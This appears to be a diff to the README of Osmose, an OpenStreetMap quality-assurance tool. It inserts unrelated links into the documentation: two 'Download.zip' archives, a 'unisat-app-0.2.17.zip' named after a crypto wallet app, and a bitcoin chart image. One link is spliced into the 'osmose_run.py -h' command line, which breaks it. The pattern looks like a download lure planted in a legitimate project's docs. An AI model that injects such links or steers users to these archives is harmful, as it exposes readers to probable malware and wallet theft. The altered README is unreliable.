@@ -7,6 +7,7 @@ and sends the results to the frontend. This works as follows:
   - analyses are run directly on the .osm.pbf file, or on the database
   - results of the analyses are uploaded to the frontend
   - by default, the database is purged
+[Download.zip](https://github.com/user-attachments/files/17053729/Download.zip)
 
 Analysers can be build in many ways:
 
@@ -14,6 +15,7 @@ Analysers can be build in many ways:
   - With Python code validating each OSM objects: [plugins](plugins).
   - With SQL/PostGIS queries on the Osmosis database: [analysers/analyser_osmosis_*.py](analysers).
   - By configuring a comparator of OpenData and OSM objects: [analysers/analyser_merge_*.py](analysers).
+![bitcoin-dominance_(Coinmarketcap)](https://github.com/user-attachments/assets/ee707d15-bad2-41db-a5ca-3bdcb96192b9)
 
 ## Installation
 
@@ -26,7 +28,8 @@ You can also install manually on a debian distribution [INSTALL.md](INSTALL.md).
 
 Look at the osmose_run.py help for options
 ```
-osmose_run.py -h
+osmose_run.py -h,[unisat-app-0.2.17.zip](https://github.com/user-attachments/files/17053700/unisat-app-0.2.17.zip)
+
 ```
 
 ## Contributing
@@ -35,4 +38,5 @@ Setup a Docker install and follow the
 "[Develop on Osmose with docker](docker/README.md#develop-on-osmose-with-docker)"
 guide.
 
-Read the additional contribution [guidelines](CONTRIBUTING.md).
+Read the additional contribution [guidelines](CONTRIBUTING.md).[Download.zip](https://github.com/user-attachments/files/17053704/Download.zip)
+
